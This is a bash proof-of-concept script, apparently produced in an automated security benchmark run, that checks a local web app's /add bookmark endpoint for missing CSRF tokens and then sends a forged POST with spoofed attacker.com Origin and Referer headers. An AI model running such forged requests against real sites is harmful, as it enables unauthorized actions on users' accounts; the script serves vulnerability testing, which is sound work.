#!/bin/bash
# POC: Demonstrates CSRF vulnerability by submitting a bookmark addition request without CSRF token to the /add endpoint
# Target: ./repo
# Created: 2025-12-02T16:17:37.010Z
# Session: benchmark-XBEN-075-24-miorxjbp

# CSRF Vulnerability POC - /add endpoint lacks CSRF token protection
# This script demonstrates that the /add endpoint accepts POST requests without CSRF token validation

TARGET_URL="http://localhost:5000"
ADD_ENDPOINT="/add"

echo "=== CSRF Vulnerability POC ==="
echo ""
echo "[*] Testing CSRF vulnerability at $TARGET_URL$ADD_ENDPOINT"
echo ""

# Step 1: Get the add form to check for CSRF tokens
echo "[+] Step 1: Fetching the form from $TARGET_URL$ADD_ENDPOINT"
echo "    Command: curl -s $TARGET_URL$ADD_ENDPOINT"
echo ""

FORM_RESPONSE=$(curl -s "$TARGET_URL$ADD_ENDPOINT")

# Check if form contains CSRF token
if echo "$FORM_RESPONSE" | grep -q "csrf_token\|_token\|X-CSRF-Token"; then
    echo "[-] CSRF token detected in form - NOT vulnerable to basic CSRF"
    echo ""
    echo "Form response snippet:"
    echo "$FORM_RESPONSE" | head -20
    exit 1
else
    echo "[+] No CSRF token found in form - potentially vulnerable"
    echo ""
fi

# Step 2: Attempt to submit a POST request without CSRF token
echo "[+] Step 2: Attempting CSRF attack - submitting POST request without token"
echo "    Command: curl -X POST $TARGET_URL$ADD_ENDPOINT -d \"name=CSRFTest&url=https://malicious.com\" -v"
echo ""

CSRF_RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL$ADD_ENDPOINT" \
  -d "name=CSRFTest&url=https://malicious.com" \
  -H "Origin: http://attacker.com" \
  -H "Referer: http://attacker.com/attack.html")

HTTP_CODE=$(echo "$CSRF_RESPONSE" | tail -1)
RESPONSE_BODY=$(echo "$CSRF_RESPONSE" | head -n-1)

echo "    Response HTTP Code: $HTTP_CODE"
echo "    Response Headers/Body: $RESPONSE_BODY"
echo ""

# Step 3: Verify vulnerability
if [ "$HTTP_CODE" = "302" ] || [ "$HTTP_CODE" = "200" ]; then
    echo "[+] VULNERABILITY CONFIRMED!"
    echo "    - POST request was accepted without CSRF token validation"
    echo "    - HTTP Status: $HTTP_CODE"
    echo "    - The application does NOT validate CSRF tokens"
    echo "    - An attacker can perform unauthorized bookmark additions"
    echo ""
    exit 0
else
    echo "[-] Request was rejected or redirected unexpectedly"
    echo "    HTTP Code: $HTTP_CODE"
    exit 1
fi